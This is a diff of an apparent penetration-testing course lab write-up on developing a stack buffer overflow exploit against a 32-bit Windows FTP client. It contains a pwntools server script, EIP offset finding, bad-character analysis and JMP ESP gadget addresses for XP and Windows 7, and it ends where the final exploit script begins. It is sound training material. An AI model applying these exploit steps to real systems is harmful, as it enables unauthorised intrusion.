@@ -3,7 +3,7 @@ Exploit development
 Stage 1: Verifying the exploitable condition
 --------------------------------------------
 
-Using immunity debugger and Python, we will verify if our client application is vulnerable and if it is, we will figure out how large our buffer needs to be to trigger our overflow.
+Using Immunity debugger and Python, we will verify if our client application is vulnerable and if it is, we will figure out how large our buffer needs to be to trigger our overflow.
 
 ```
 from pwn import *
@@ -15,6 +15,8 @@ conn = l.wait_for_connection()
 conn.sendline('220 ' + buf + '\r\n')
 conn.recv()
 ```
+
+We see we can control EIP as it is set to 0x41414141 (or "AAAA")
 
 ![alt text](https://github.com/sourcekris/PTPv3/raw/master/lab1/s1.PNG "")
 
@@ -35,6 +37,8 @@ conn.recv()
 ```
 
 ![alt text](https://github.com/sourcekris/PTPv3/raw/master/lab1/s2.PNG "")
+
+Now our EIP value is set to 0x30684239, lets use pattern_offset.rb to find out how far into our buffer that sequence exists:
 
 ```
 root@ubuntu:~/ecppt/labs/lab1# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 30684239
@@ -77,7 +81,7 @@ root@ubuntu:~/ecppt/labs/lab1# msfpescan -j esp 32bitftp.exe
 0x004d8ffb jmp esp
 ```
 
-All of these have nulls in them, so we need to validate if nul is fine in our buffer.
+All of these have nulls in them, so we need to validate if null is fine in our buffer.
 
 We're gonna test by setting the EIP value to our JMP ESP and setting a breakpoint to see if it reaches it.
 
@@ -100,6 +104,8 @@ conn.recv()
 ![alt text](https://github.com/sourcekris/PTPv3/raw/master/lab1/s3_2.PNG "")
 
 We see that our EIP value was set to 0x3e45eb3b instead of 0x0045eb3b meaning our null byte was not sucessfully passed throught the FTP client onto the stack. So we need to find a JMP esp in a loaded segment without null bytes.
+
+I also want to avoid the \n and \r characters (0x0a and 0x0d) as these also have a special meaning to an FTP client in that it's reached the end of a line.
 
 We examine the loaded modules and see quite a number that have longer 32bit addresses:
 
@@ -276,7 +282,7 @@ So let's find a non-null containing JMP ESP gadget and try it! Examining the exe
 
 ![alt text](https://github.com/sourcekris/PTPv3/raw/master/lab1/s6_2.PNG "")
 
-For you reference, this client is Windows 7 Professional SP1 32 bit:
+For your reference, this client is Windows 7 Professional SP1 32 bit:
 
 ![alt text](https://github.com/sourcekris/PTPv3/raw/master/lab1/s6_3.PNG "")
 
@@ -293,7 +299,7 @@ root@ubuntu:~/ecppt/labs/lab1# msfpescan -j esp ntdll-win7sp1.dll
 0x77f60ad0 jmp esp
 ```
 
-Let's use 0x77f1e871 which is actually loaded at 0x7775e871 and make a small adjustment to the exploit to target both XP or Win7:
+Let's use 0x77f1e871 (which is actually loaded at **0x7775e871** according to the Immunity debugger's "Executable modules" window and a bit of Binary string searching) and make a small adjustment to the exploit to target both XP or Win7:
 
 ```
 #!/usr/bin/python
